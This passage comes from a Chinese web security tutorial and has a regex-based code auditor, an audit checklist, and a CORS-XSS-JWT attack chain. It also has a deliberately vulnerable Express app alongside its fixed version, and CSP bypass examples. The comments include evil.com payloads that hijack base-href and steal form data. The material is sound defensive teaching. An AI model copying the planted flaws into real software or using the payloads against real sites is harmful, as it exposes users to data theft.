        regex: /process\.env\.\w*SECRET|process\.env\.\w*KEY|process\.env\.\w*PASSWORD/,
        severity: 'INFO',
        title: '环境变量使用 (确认不在代码中硬编码)',
        fix: '确保密钥来自环境变量或 KMS'
      },
      {
        regex: /ALLOW.*ORIGIN.*\*/i,
        severity: 'HIGH',
        title: 'CORS 允许所有来源',
        fix: '使用白名单'
      },
      {
        regex: /mongoose\.connect.*password/i,
        severity: 'HIGH',
        title: '数据库密码可能在连接字符串中',
        fix: '使用环境变量'
      },
      {
        regex: /__proto__|constructor\.prototype/,
        severity: 'HIGH',
        title: '原型链操作 (污染风险)',
        fix: '使用 Object.create(null) 或安全合并'
      },
      {
        regex: /jwt\.decode\s*\(/,
        severity: 'MEDIUM',
        title: 'jwt.decode (未验证签名)',
        fix: '使用 jwt.verify'
      },
      {
        regex: /exec\s*\(|execSync\s*\(/,
        severity: 'CRITICAL',
        title: '命令执行 (命令注入风险)',
        fix: '使用 spawn/execFile + 参数数组'
      },
      {
        regex: /fs\.readFileSync.*req\.|fs\.readFile.*req\./,
        severity: 'HIGH',
        title: '基于用户输入的文件读取 (路径遍历)',
        fix: '使用 path.resolve + 白名单目录'
      }
    ];

    for (const file of files) {
      try {
        const content = fs.readFileSync(file, 'utf8');
        for (const pattern of patterns) {
          const matches = content.match(pattern.regex);
          if (matches) {
            this.findings.push({
              severity: pattern.severity,
              category: 'code-pattern',
              title: pattern.title,
              file: file,
              match: matches[0],
              fix: pattern.fix
            });
          }
        }
      } catch (e) {
        // 跳过无法读取的文件
      }
    }
  }

  // 3. 配置检查
  scanConfig() {
    // 检查 helmet
    // 检查 CORS
    // 检查速率限制
    // 检查 CSP
    const mainFiles = this.getAllFiles(this.projectRoot, ['app.js', 'server.js', 'index.js', 'main.ts']);

    for (const file of mainFiles) {
      try {
        const content = fs.readFileSync(file, 'utf8');

        if (!content.includes('helmet') && !content.includes('X-Frame-Options')) {
          this.findings.push({
            severity: 'MEDIUM',
            category: 'config',
            title: '缺少安全头中间件',
            file,
            fix: '添加 helmet 中间件'
          });
        }

        if (!content.includes('rate-limit') && !content.includes('rateLimit')) {
          this.findings.push({
            severity: 'LOW',
            category: 'config',
            title: '缺少速率限制',
            file,
            fix: '添加 express-rate-limit'
          });
        }
      } catch (e) {}
    }
  }

  getAllFiles(dir, extensions) {
    const results = [];
    try {
      const items = fs.readdirSync(dir);
      for (const item of items) {
        if (['node_modules', '.git', 'dist', 'build'].includes(item)) continue;
        const full = `${dir}/${item}`;
        const stat = fs.statSync(full);
        if (stat.isDirectory()) {
          results.push(...this.getAllFiles(full, extensions));
        } else if (extensions.some(ext => item.endsWith(ext))) {
          results.push(full);
        }
      }
    } catch (e) {}
    return results;
  }

  getReport() {
    const critical = this.findings.filter(f => f.severity === 'CRITICAL');
    const high = this.findings.filter(f => f.severity === 'HIGH');
    const medium = this.findings.filter(f => f.severity === 'MEDIUM');
    const low = this.findings.filter(f => f.severity === 'LOW');

    return {
      summary: {
        total: this.findings.length,
        critical: critical.length,
        high: high.length,
        medium: medium.length,
        low: low.length
      },
      findings: this.findings
    };
  }
}

// --- 使用 ---
const auditor = new SecurityAuditor(process.cwd());
auditor.scanCodePatterns();
const report = auditor.getReport();
console.log(JSON.stringify(report, null, 2));
```

### 8.2 手动审计 Checklist

```
□ 输入验证
  □ 所有 API 端点有输入验证
  □ 使用白名单而非黑名单
  □ 长度/类型/格式/范围检查
  □ 文件上传: 魔数验证 + 类型白名单 + 随机文件名

□ 输出编码
  □ HTML 上下文: 转义 < > " ' &
  □ 属性上下文: 转义 " ' > < `
  □ JS 上下文: 转义 \ " ' < >
  □ URL 上下文: encodeURIComponent
  □ CSS 上下文: 限制值范围

□ 认证
  □ 密码 bcrypt (cost ≥ 12)
  □ 登录速率限制
  □ 失败锁定 (5 次 → 锁定 15 分钟)
  □ MFA 支持
  □ Session 固定防护
  □ JWT: verify + 算法白名单 + 过期

□ 授权
  □ 每个 API 有权限检查
  □ IDOR 防护 (检查资源所有权)
  □ 最小权限原则
  □ 管理员操作审计日志

□ 传输安全
  □ HTTPS 强制
  □ HSTS (max-age ≥ 31536000)
  □ Cookie: HttpOnly + Secure + SameSite
  □ CORS 白名单

□ 安全头
  □ X-Frame-Options: DENY
  □ X-Content-Type-Options: nosniff
  □ CSP (至少 report-only)
  □ Referrer-Policy
  □ Permissions-Policy

□ 错误处理
  □ 生产环境不泄露堆栈
  □ 统一错误格式
  □ 敏感错误不返回细节
  □ 日志记录 (不含密码/token)

□ 依赖
  □ npm audit 无 critical
  □ 锁定版本 (package-lock.json)
  □ 定期更新
  □ 最小依赖原则
```

---

## 9. 综合攻防演练 — 多向量组合攻击

### 9.1 场景: 完整攻击链

```
┌──────────────────────────────────────────────────────────┐
│  攻击链: CORS 错误 → XSS → Session 窃取 → 权限提升       │
│                                                          │
│  1. 发现 CORS 配置: Access-Control-Allow-Origin: *       │
│     → 攻击者页面可读取 API 响应                            │
│                                                          │
│  2. 发现搜索框反射型 XSS: /search?q=<script>             │
│     → 但 CSP 阻止内联脚本执行                              │
│                                                          │
│  3. 发现 CSP nonce 可预测 (基于时间戳)                     │
│     → 攻击者猜测 nonce，注入脚本                           │
│                                                          │
│  4. 脚本执行:                                            │
│     fetch('/api/user/profile', {credentials:'include'})  │
│     → 通过 CORS 读取响应 → 获取用户数据                    │
│                                                          │
│  5. 发现 JWT 使用 alg:none                               │
│     → 伪造 admin token                                    │
│                                                          │
│  6. 使用 admin token 访问管理接口                          │
│     → 完整权限控制                                        │
└──────────────────────────────────────────────────────────┘
```

### 9.2 实战: 漏洞修复对照

```javascript
// --- 漏洞应用 (修复前) ---
// File: src/vulnerable-app.js (仅用于学习)

const express = require('express');
const jwt = require('jsonwebtoken');
const app = express();

// ❌ 漏洞 1: CORS 允许所有
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});

// ❌ 漏洞 2: XSS - 直接渲染用户输入
app.get('/search', (req, res) => {
  const q = req.query.q || '';
  res.send(`<h1>Results for: ${q}</h1>`);
});

// ❌ 漏洞 3: JWT 不验证算法
app.get('/api/user', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  const decoded = jwt.decode(token); // 不验证!
  res.json(decoded);
});

// ❌ 漏洞 4: 无安全头
// ❌ 漏洞 5: 无速率限制
// ❌ 漏洞 6: 错误泄露堆栈

// --- 安全应用 (修复后) ---
// File: src/secure-app.js

const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

const app = express();

// ✅ 修复 1: 安全 CORS
const ALLOWED_ORIGINS = new Set(['https://app.example.com']);
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin');
  }
  next();
});

// ✅ 修复 2: Helmet 安全头
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => {
        // 动态 nonce
        const nonce = crypto.randomBytes(16).toString('base64');
        res.locals.cspNonce = nonce;
        return `'nonce-${nonce}'`;
      }],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: []
    }
  },
  xFrameOptions: { action: 'deny' },
  xContentTypeOptions: true
}));

// ✅ 修复 3: XSS 防护 - 转义用户输入
const escapeHtml = (str) => String(str)
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;')
  .replace(/'/g, '&#x27;');

app.get('/search', (req, res) => {
  const q = escapeHtml(req.query.q || '');
  res.send(`<h1>Results for: ${q}</h1>`);
});

// ✅ 修复 4: JWT 安全验证
const JWT_SECRET = crypto.randomBytes(64).toString('hex');

app.get('/api/user', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });

  try {
    const decoded = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'],
      maxAge: '15m'
    });
    res.json(decoded);
  } catch (e) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

// ✅ 修复 5: 速率限制
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
});
app.use(limiter);

// ✅ 修复 6: 安全错误处理
app.use((err, req, res, next) => {
  // 生产环境不泄露堆栈
  const isDev = process.env.NODE_ENV === 'development';
  res.status(err.status || 500).json({
    error: isDev ? err.message : 'Internal server error',
    ...(isDev && { stack: err.stack })
  });
});
```

### 9.3 攻防演练: CSP 绕过与反绕过

```javascript
// --- 绕过 1: 宽松 script-src ---
// CSP: script-src 'self' https://cdn.example.com
// 攻击: 如果 cdn.example.com 有上传功能 → 上传恶意 JS → 执行

// 反绕过: 最小化 script-src，不使用通配符域名
// CSP: script-src 'self' 'nonce-随机值'

// --- 绕过 2: unsafe-inline + 注入 nonce ---
// CSP: script-src 'self' 'nonce-abc123' 'unsafe-inline'
// 攻击: unsafe-inline 使 nonce 无效，任何内联脚本都能执行

// 反绕过: 不要同时使用 nonce 和 unsafe-inline
// 如果必须用 unsafe-inline，说明 nonce 部署有问题

// --- 绕过 3: base-uri 未限制 ---
// CSP: 未设置 base-uri
// 攻击: <base href="https://evil.com/"> 劫持相对路径脚本
// <script src="/app.js"> → 实际加载 https://evil.com/app.js

// 反绕过: CSP: base-uri 'self'

// --- 绕过 4: form-action 未限制 ---
// CSP: 未设置 form-action
// 攻击: <form action="https://evil.com/steal"> 窃取表单数据

// 反绕过: CSP: form-action 'self'

// --- 绕过 5: report-uri 泄露 ---
// CSP: report-uri https://report.example.com/csp
// 攻击: 如果 report 端点有 XSS → CSP 报告中的 URL 参数可注入

// 反绕过: 报告端点也需要 XSS 防护
```

---

## 10. v9 新增知识点总结

### 与前 8 轮的差异化

| 主题 | v1-v8 | v9 (本次) |
|------|-------|-----------|
| XSS | 反射/存储/DOM/高级变种 | 不再重复，聚焦组合攻击链 |
| CSRF | SameSite/Token/双重Cookie | 不再重复，聚焦与 CORS 联动 |
| Sanitization | DOMPurify/上下文净化/富文本 | 不再重复，聚焦 MIME 嗅探防御 |
| CSP | 基础/指令/Nonce/绕过 | 不再重复，聚焦 base-uri/form-action |
| **新: Prototype Pollution** | ❌ | ✅ 完整攻击链 + 防御 |
| **新: JWT 安全** | ❌ | ✅ alg:none/密钥/轮换/撤销 |
| **新: CORS 安全** | ❌ | ✅ 白名单/子域绕过/凭证 |
| **新: Clickjacking** | ❌ | ✅ X-Frame-Options/CSP frame-ancestors |
| **新: MIME Sniffing** | ❌ | ✅ nosniff/魔数验证/SVG 净化 |
| **新: SRI** | ❌ | ✅ 完整性校验/动态注入 |
| **新: Cookie 深度** | ❌ | ✅ SameSite 分析/Session 固定/Idle Timeout |
| **新: 安全审计** | 基础清单 | ✅ 自动扫描 + 手动 Checklist + 工作流 |
| **新: 组合攻击链** | 单向量 | ✅ 多向量串联实战 |

### 核心收获

1. **Prototype Pollution** 是 JS 独有的攻击面 — 递归合并必须跳过 `__proto__`/`constructor`/`prototype`
2. **JWT 不是银弹** — alg:none、弱密钥、无过期、无撤销都是致命问题
3. **CORS 配置错误是最常见的安全漏洞之一** — 反射 Origin 等同于允许所有
4. **Clickjacking 防御是双层的** — X-Frame-Options (兼容) + CSP frame-ancestors (现代)
5. **MIME sniffing 是浏览器历史遗留问题** — X-Content-Type-Options: nosniff 是必选项
6. **SRI 是 CDN 场景的必备防线** — 哈希验证确保资源未被篡改
7. **安全是组合拳** — 单点防御会被组合攻击绕过，纵深防御才是关键
8. **审计工作流** — 自动扫描 (依赖/代码模式) + 手动 Checklist + 修复验证

### 防御优先级 (v9 新增)

```
P0 (必须):
  - 递归合并: 跳过 __proto__/constructor/prototype
  - JWT: verify + algorithms 白名单 + expiresIn
  - CORS: 严格白名单 (不用反射 Origin)
  - X-Frame-Options: DENY
  - X-Content-Type-Options: nosniff
  - CSP: base-uri 'self' + form-action 'self'

P1 (重要):
  - JWT refresh token 轮换 + 撤销
  - Cookie: HttpOnly + Secure + SameSite
  - Session 固定防护 (登录后轮换)
  - SRI (CDN 场景)
  - 文件上传: 魔数验证 + 随机文件名

P2 (建议):
  - Idle timeout
  - CORS subdomain 正则白名单
  - SVG 净化
  - 安全审计自动化
```

---

*v9 完成 | 覆盖: Prototype Pollution / JWT 安全 / CORS / Clickjacking / MIME Sniffing / SRI / Cookie 深度 / 安全审计 / 组合攻击链*
*累计: v1-v9 ~500KB+ 安全专项训练*
